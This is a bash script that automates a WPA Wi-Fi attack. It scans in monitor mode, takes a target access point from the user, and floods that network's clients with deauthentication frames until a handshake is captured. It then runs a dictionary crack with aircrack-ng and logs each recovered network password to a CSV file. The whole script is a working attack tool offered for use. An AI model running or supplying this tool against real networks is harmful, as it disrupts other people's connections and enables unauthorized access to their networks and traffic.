#!/bin/bash

confirm_run_as_root(){
    if [ $UID -ne 0 ]
    then
        usage
        echo ""
        echo "Program must be run as root" 1>&2
        echo ""
        exit 1
    fi
}

usage(){
cat << EOF
Usage: $(basename $0) [options]

Options:
EOF

cat << EOF | column -s\& -t
-d|--dict & Specificy dictionary to use when cracking WPA.
-h|--help & Display Help
EOF

cat << EOF

Examples:
sudo ./$(basename $0) --dict wordlist.txt
EOF
}

get_iface(){
    iface=$(iwconfig 2>/dev/null | grep -i 'IEEE' | cut -d " " -f 1)
    if [ -z ${iface} ];then
        echo "could not find wireless interface" 1>&2
        exit 1
    fi
}

stop_monitor_mode(){
    iwconfig ${iface} 2>/dev/null | grep -q 'Mode:Monitor'
    if [ $? -eq 0 ];then
        airmon-ng stop ${iface} &>/dev/null
        echo 'Stop Wireless interface Monitor mode'
    fi
}

start_monitor_mode(){
    iwconfig ${iface} 2>/dev/null | grep -q 'Mode:Managed'
    if [ $? -eq 0 ];then
        airmon-ng start ${iface} &>/dev/null
        echo 'Start Wireless interface Monitor mode'
    fi
}

get_ap_info(){
    ap_channel=$(cat ${temp_dir}/wifite-01.csv | grep ^${ap_bssid} | cut -d ',' -f 4)
    ap_ssid=$(cat ${temp_dir}/wifite-01.csv | grep ^${ap_bssid} \
    | cut -d ',' -f 14 | sed 's/[^0-9a-zA-Z_]//g')
    expr ${ap_channel} + 0 &>/dev/null
    if [ $? -ne 0 ];then
        while true;do
            read -p 'Please select the ap channel manually: ' ap_channel
            expr ${ap_channel} + 0 &>/dev/null && break
        done
    fi
    if [ -z ${ap_ssid} ];then
        while true;do
            read -p 'Please select the ap ssid manually: ' ap_ssid
            ap_ssid=$(echo ${ap_ssid} | sed 's/[^0-9a-zA-Z_]//g')
            [ -z ${ap_ssid} ] && break
        done
    fi
}

send_deauth(){
    i=0
    clients=($(cat ${temp_dir}/handshake-01.csv \
        | grep -E ${mac_pattern}.*${mac_pattern} | grep -oE ^${mac_pattern}))
        if [ ${#clients[@]} -gt 0 ];then
            aireplay_cmd=(aireplay-ng --ignore-negative-one --deauth 1 -a)
            for client in ${clients[*]};do
                aireplay_cmd[${#aireplay_cmd[@]}]=${ap_bssid}
                aireplay_cmd[${#aireplay_cmd[@]}]='-c'
                aireplay_cmd[${#aireplay_cmd[@]}]=${client}
                aireplay_cmd[${#aireplay_cmd[@]}]=${iface}
                ${aireplay_cmd[*]} &>/dev/null
                echo -en "\rSending deauth to ${client}"
                sleep 1
                i=$[$i + 1]
            done
        fi
    if [ ${i} -eq 1 ];then
        echo -en "\nSending deauth to ${i} client..."
        sleep 10
    elif [ ${i} -gt 1 ];then
        echo -en "\nSending deauth to ${i} clients..."
        sleep 10
    else
        echo -en "\rWaiting clients to connecting......"
        sleep 1
    fi
}

handshake_check(){
    echo"" | aircrack-ng -a 2 -w - -b ${ap_bssid} ${temp_dir}/handshake-01.cap \
    2>/dev/null | grep -q 'Passphrase not in dictionary'
    if [ $? -eq 0 ];then
        handshake_sig=0
        kill -15 ${airodump_pid[0]}
        apbssid=$(echo ${ap_bssid} | tr ":" "-")
        cap_time=$(date '+%M%S')
        echo -e "\nSuccess!saved as ${cap_dir}/${ap_ssid}_${apbssid}_${cap_time}.cap"
        stop_monitor_mode
        cp ${temp_dir}/handshake-01.cap ${cap_dir}/${ap_ssid}_${apbssid}_${cap_time}.cap
        if [ ! -z ${dict_file} ];then
            aircrack-ng -a 2 -w ${dict_file} -l ${temp_dir}/wpakey.txt \
            -b ${ap_bssid} ${cap_dir}/${ap_ssid}_${apbssid}_${cap_time}.cap
            if [ -f ${temp_dir}/wpakey.txt ];then
                password=$(cat ${temp_dir}/wpakey.txt)
                echo "${ap_ssid},${apbssid},${password}" >> ${cracked_csv}
            fi
        else
            exit 0
        fi
    fi
}

# iface_mode=$(iwconfig ${1} 2>/dev/null | grep -oE 'Mode:[^ ]+')
initialization(){
    confirm_run_as_root
    get_iface
    stop_monitor_mode
    CURRENT_DIR=$(cd `dirname $0`;pwd)
    cd ${CURRENT_DIR}
    handshake_sig=1
    temp_dir=${CURRENT_DIR}/temp
    [ -d ${temp_dir} ] || mkdir -p ${temp_dir}
    [ -d ${temp_dir} ] && rm -rf ${temp_dir}/*
    cap_dir=${CURRENT_DIR}/handshake
    [ -d ${cap_dir} ] || mkdir -p ${cap_dir}
    cracked_csv=${CURRENT_DIR}/cracked.csv
    [ -f ${cracked_csv} ] || echo "SSID,BSSID,PASSWORD" > ${cracked_csv}
    mac_pattern='([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}'
}

scan_interface(){
    get_iface
    iface_mac=$(iwconfig ${iface} | grep -oE ${mac_pattern})
    [ -n ${iface_mac} ] && start_monitor_mode
    sleep 1
    get_iface
    airodump_cmd=(airodump-ng -a --write-interval 1 -w ${temp_dir}/wifite)
    airodump_cmd[${#airodump_cmd[@]}]=${iface}
    ${airodump_cmd[*]}
}

wpa_attack(){
    trap "airmon-ng stop ${iface} &>/dev/null && exit 0" SIGINT
    while true;do
        read -p 'Please select target BSSID to Crack: ' ap_bssid
        echo ${ap_bssid} | grep -oqE ^${mac_pattern}$ && break
    done
    get_ap_info
    airodump_cmd=(airodump-ng -w ${temp_dir}/handshake --write-interval 1 --bssid)
    airodump_cmd[${#airodump_cmd[@]}]=${ap_bssid}
    airodump_cmd[${#airodump_cmd[@]}]='-c'
    airodump_cmd[${#airodump_cmd[@]}]=${ap_channel}
    airodump_cmd[${#airodump_cmd[@]}]=${iface}
    ${airodump_cmd[*]} &>/dev/null &
    echo "Start sending deauth,please waiting..."
    sleep 5
    airodump_pid=($(ps -ef | grep '^root.*airodump-ng' \
    | sed 's/  */ /g' | cut -d ' ' -f 2))
    while true;do
        handshake_check
        [ ${handshake_sig} -eq 0 ] && break
        send_deauth
    done
}

while true;do
    case $1 in
        -d|--dict)
        if [ -r $2 ];then
            dict_file=$2
        else
            echo "Can't find dictionary,file $2 don't exist" 1>&2
            echo "Option $1 must be an exiting dictionary file" 1>&2
            exit 0
        fi
        shift;;
        -h|--help)
        usage
        exit 0;;
        --)
        shift
        break;;
        *)
        shift
        break;;
    esac
    shift
done

initialization
scan_interface
wpa_attack
